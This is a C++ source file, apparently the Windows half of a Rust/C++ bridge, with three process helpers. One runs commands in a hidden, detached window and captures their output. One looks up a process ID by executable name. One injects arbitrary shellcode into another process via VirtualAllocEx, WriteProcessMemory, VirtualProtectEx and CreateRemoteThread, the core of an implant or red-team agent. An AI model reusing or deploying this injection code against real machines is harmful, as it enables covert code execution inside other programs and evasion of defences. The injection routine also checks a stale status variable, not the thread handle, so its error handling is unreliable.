#include "process.h"
#include "convertor.h"
#include "process.rs.h"
#include <TlHelp32.h>
#include <Windows.h>
#include <psapi.h>

std::optional<std::tuple<HANDLE, HANDLE, HANDLE, HANDLE>> create_pipes() {
  SECURITY_ATTRIBUTES sa{};
  HANDLE stdout_rx, stdout_tx;
  HANDLE stderr_rx, stderr_tx;
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = true;
  sa.lpSecurityDescriptor = nullptr;

  if (CreatePipe(&stdout_rx, &stdout_tx, &sa, 0) == 0) {
    return std::nullopt;
  }

  if (CreatePipe(&stderr_rx, &stderr_tx, &sa, 0) == 0) {
    CloseHandle(stdout_rx);
    CloseHandle(stdout_tx);
    return std::nullopt;
  }

  return std::make_tuple(stdout_rx, stdout_tx, stderr_rx, stderr_tx);
}

void fill_si(STARTUPINFOW *si, HANDLE stdout_tx, HANDLE stderr_tx) {
  si->cb = sizeof(STARTUPINFO);
  si->hStdError = stderr_tx;
  si->hStdOutput = stdout_tx;
  si->dwFlags |= STARTF_USESTDHANDLES;
}

void read_into_rust_vec(HANDLE rx, rust::Vec<std::uint8_t> *vec) {
  std::uint8_t buffer[4096]{};
  DWORD read;

  while (ReadFile(rx, buffer, sizeof(buffer), &read, nullptr) != 0 &&
         read != 0) {
    std::copy(buffer, buffer + read, std::back_inserter(*vec));
  }
}

Output execute(rust::String command, rust::Vec<rust::String> args) {
  auto pipes = create_pipes();
  Output output{};

  if (pipes.has_value() == false) {
    return output;
  }

  auto [stdout_rx, stdout_tx, stderr_rx, stderr_tx] = pipes.value();
  std::wstring command_line;
  STARTUPINFOW si{};
  PROCESS_INFORMATION pi{};

  command_line.append(*to_wstring(command));
  command_line.push_back(L' ');
  for (auto arg : args) {
    command_line.append(*to_wstring(arg));
    command_line.push_back(L' ');
  }

  fill_si(&si, stdout_tx, stderr_tx);

  if (CreateProcessW(nullptr, command_line.data(), nullptr, nullptr, true,
                     DETACHED_PROCESS | CREATE_NO_WINDOW, nullptr, nullptr, &si,
                     &pi) == 0) {
    CloseHandle(stdout_rx);
    CloseHandle(stdout_tx);
    CloseHandle(stderr_rx);
    CloseHandle(stderr_tx);
    return output;
  }

  CloseHandle(stdout_tx);
  CloseHandle(stderr_tx);

  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  read_into_rust_vec(stdout_rx, &output.out);
  read_into_rust_vec(stderr_rx, &output.err);

  CloseHandle(stdout_rx);
  CloseHandle(stderr_rx);

  output.success = true;

  // TODO: Check the encoding
  return output;
}

bool inject_shellcode_by_id(rust::u32 pid, rust::Vec<rust::u8> shellcode,
                            rust::u32 ep_offset,
                            rust::Vec<rust::u8> parameter) {
  auto process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
  if (process == nullptr) {
    return false;
  }

  auto remote_shellcode =
      VirtualAllocEx(process, NULL, shellcode.size(), MEM_RESERVE | MEM_COMMIT,
                     PAGE_READWRITE);
  if (remote_shellcode == nullptr) {
    CloseHandle(process);
    return false;
  }

  size_t written = 0;
  auto status = WriteProcessMemory(process, remote_shellcode, shellcode.data(),
                                   shellcode.size(), &written);
  if (status == false) {
    VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
    CloseHandle(process);
    return false;
  }

  DWORD old = 0;

  status = VirtualProtectEx(process, remote_shellcode, shellcode.size(),
                            PAGE_EXECUTE_READ, &old);
  if (status == false) {
    VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
    CloseHandle(process);
    return false;
  }

  void *remote_parameter = nullptr;
  if (parameter.empty() == false) {
    remote_parameter = VirtualAllocEx(process, NULL, parameter.size(),
                                      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (remote_parameter == nullptr) {
      VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
      CloseHandle(process);
      return false;
    }

    status = WriteProcessMemory(process, remote_parameter, parameter.data(),
                                parameter.size(), &written);
    if (status == false) {
      VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
      VirtualFreeEx(process, remote_parameter, 0, MEM_RELEASE);
      CloseHandle(process);
      return false;
    }
  }

  auto thread = CreateRemoteThread(
      process, nullptr, 0,
      (LPTHREAD_START_ROUTINE)((uintptr_t)remote_shellcode + ep_offset),
      remote_parameter, 0, nullptr);
  if (status == false) {
    VirtualFreeEx(process, remote_shellcode, 0, MEM_RELEASE);
    VirtualFreeEx(process, remote_parameter, 0, MEM_RELEASE);
    CloseHandle(process);
    return false;
  }

  CloseHandle(thread);
  CloseHandle(process);
  return true;
}

rust::u32 get_id_by_name(rust::String name) {
  auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE) {
    return 0;
  }

  PROCESSENTRY32W entry{};
  entry.dwSize = sizeof(PROCESSENTRY32W);
  auto status = Process32FirstW(snapshot, &entry);

  if (status == 0) {
    CloseHandle(snapshot);
    return 0;
  }

  do {
    if (to_wstring(name) == entry.szExeFile) {
      CloseHandle(snapshot);
      return entry.th32ProcessID;
    }
  } while (Process32NextW(snapshot, &entry) != 0);

  CloseHandle(snapshot);
  return 0;
}
